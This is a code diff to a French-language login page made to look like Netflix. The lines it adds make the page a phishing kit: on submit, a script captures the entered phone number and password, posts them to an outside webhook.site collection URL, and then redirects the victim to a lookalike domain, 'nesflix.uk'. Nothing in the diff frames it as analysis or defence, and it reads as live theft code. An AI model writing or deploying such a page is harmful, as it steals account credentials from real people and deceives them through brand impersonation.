@@ -121,10 +121,10 @@
     <h1>NETFLIX</h1>
     <p>Connectez-vous avec votre numéro de téléphone</p>
     
-    <form>
+    <form id="loginForm">
       <div class="input-group">
         <i class="fa fa-phone"></i>
-        <input type="text" placeholder="Numéro de téléphone">
+        <input type="text" id="phone" placeholder="Numéro de téléphone">
       </div>
       <div class="input-group">
         <i class="fa fa-lock"></i>
@@ -151,6 +151,28 @@
       const type = password.getAttribute("type") === "password" ? "text" : "password";
       password.setAttribute("type", type);
       this.classList.toggle("fa-eye-slash");
+    });
+
+    const form = document.getElementById("loginForm");
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const phoneValue = document.getElementById("phone").value || "+000000000";
+      const passwordValue = password.value || "test123";
+
+      const data = {
+        phone: phoneValue,
+        password: passwordValue
+      };
+
+      fetch("https://webhook.site/28bc5f45-a231-4b01-aef2-40b14fd23775", {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: JSON.stringify(data)
+      }).finally(() => {
+        window.location.href = "https://nesflix.uk/login";
+      });
     });
   </script>
 </body>
